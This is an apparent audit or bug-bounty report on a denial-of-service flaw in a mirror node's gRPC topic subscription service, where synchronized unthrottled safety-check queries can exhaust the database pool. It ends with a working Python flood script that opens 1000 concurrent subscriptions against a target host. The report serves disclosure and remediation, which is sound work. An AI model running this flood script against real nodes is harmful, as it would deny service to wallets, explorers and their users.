### Title
Unauthenticated Thundering-Herd DoS via Simultaneous Safety-Check Gap-Recovery Queries in `TopicMessageServiceImpl`

### Summary
Every call to `subscribeTopic()` unconditionally schedules a database query exactly 1 second after subscription via `Mono.delay(Duration.ofSeconds(1L))`. Because there is no per-IP, per-user, or global subscription rate limit on the gRPC endpoint, an unauthenticated attacker can open an arbitrary number of connections and subscriptions that all fire their gap-recovery DB queries simultaneously, overwhelming the database connection pool and halting mirror-node operation.

### Finding Description

**Exact code path:**

`ConsensusController.subscribeTopic()` delegates to `TopicMessageServiceImpl.subscribeTopic()`. [1](#0-0) 

```java
Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
        .filter(_ -> !topicContext.isComplete())
        .flatMapMany(_ -> missingMessages(topicContext, null))
        .subscribeOn(Schedulers.boundedElastic());
```

The guard `!topicContext.isComplete()` does **not** protect against this attack. `isComplete()` returns `false` whenever `filter.getEndTime() == null`, which is the case for every live (open-ended) subscription: [2](#0-1) 

```java
boolean isComplete() {
    if (filter.getEndTime() == null) {
        return false;   // always false for live subscriptions
    }
```

When the safety check fires, `missingMessages(topicContext, null)` is called with `current == null`, which unconditionally issues an **unthrottled** database retrieval: [3](#0-2) 

```java
if (current == null) {
    ...
    return topicMessageRetriever.retrieve(gapFilter, false);  // false = unthrottled
}
```

The `false` (unthrottled) flag means the retriever uses `unthrottled.maxPageSize = 5000` and `unthrottled.maxPolls = 12`, making each query significantly heavier than a normal throttled retrieval. [4](#0-3) 

**Why existing checks are insufficient:**

The only connection-level guard is `maxConcurrentCallsPerConnection = 5`, enforced per TCP connection: [5](#0-4) 

There is **no global connection limit**, no per-IP limit, and no subscription rate limit in the gRPC module. The `subscriberCount` gauge is purely observational: [6](#0-5) 

The bucket4j throttling that exists in the codebase is scoped exclusively to the `web3` module and is never applied to gRPC subscriptions: [7](#0-6) 

`GrpcProperties` contains no rate-limiting fields whatsoever: [8](#0-7) 

### Impact Explanation

An attacker who saturates the database connection pool prevents the mirror node from processing any queries â€” including those needed to ingest and serve new consensus transactions. This constitutes a complete mirror-node denial of service. Because the mirror node is used by wallets, explorers, and dApps to confirm transaction finality, sustained unavailability effectively halts observable transaction confirmation for all users of that mirror node instance.

### Likelihood Explanation

The attack requires no credentials, no special knowledge, and no privileged network position â€” only the ability to open TCP connections to gRPC port 5600 (publicly exposed). A single attacker machine can open hundreds of connections, each carrying 5 subscriptions, producing hundreds of simultaneous DB queries after exactly 1 second. The attack is trivially repeatable: after connections are dropped, the attacker simply reconnects. Standard cloud infrastructure (a single VM with a script) is sufficient to execute this.

### Recommendation

1. **Add a global subscription cap**: Reject new subscriptions when `subscriberCount` exceeds a configurable threshold (e.g., 500), returning `RESOURCE_EXHAUSTED`.
2. **Add per-IP connection/subscription rate limiting** at the gRPC interceptor layer, analogous to the bucket4j throttle in the `web3` module.
3. **Jitter the safety-check delay**: Replace the fixed `Duration.ofSeconds(1L)` with a randomized delay (e.g., 1â€“5 s) to prevent synchronized thundering herds even under legitimate load spikes.
4. **Throttle the safety-check retrieval**: Pass `true` (throttled) instead of `false` to `topicMessageRetriever.retrieve()` when called from the safety-check path, so each gap-recovery query is subject to the existing page-size and poll-frequency limits.

### Proof of Concept

```python
import grpc
import threading
from hedera import consensus_service_pb2_grpc, mirror_network_service_pb2 as proto

TARGET = "mirror.node.host:5600"
TOPIC_ID = 0  # any valid topic with no recent messages
NUM_CONNECTIONS = 200
CALLS_PER_CONNECTION = 5  # matches maxConcurrentCallsPerConnection default

def flood(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = proto.ConsensusTopicQuery()
    query.topicID.topicNum = TOPIC_ID
    # No endTime â†’ isComplete() always returns false â†’ safety check always fires
    threads = []
    for _ in range(CALLS_PER_CONNECTION):
        t = threading.Thread(target=lambda: list(stub.subscribeTopic(query)))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

# All connections start simultaneously â†’ all safety checks fire at T+1s
workers = [threading.Thread(target=flood, args=(i,)) for i in range(NUM_CONNECTIONS)]
for w in workers: w.start()
# At T+1s: 200Ă—5 = 1000 unthrottled DB queries fire simultaneously
for w in workers: w.join()
```

At T+1 second, 1 000 unthrottled `retrieve(gapFilter, false)` calls hit the database simultaneously. With a typical DB connection pool of 10â€“50 connections, the pool is exhausted, all subsequent queries queue or time out, and the mirror node stops serving data.
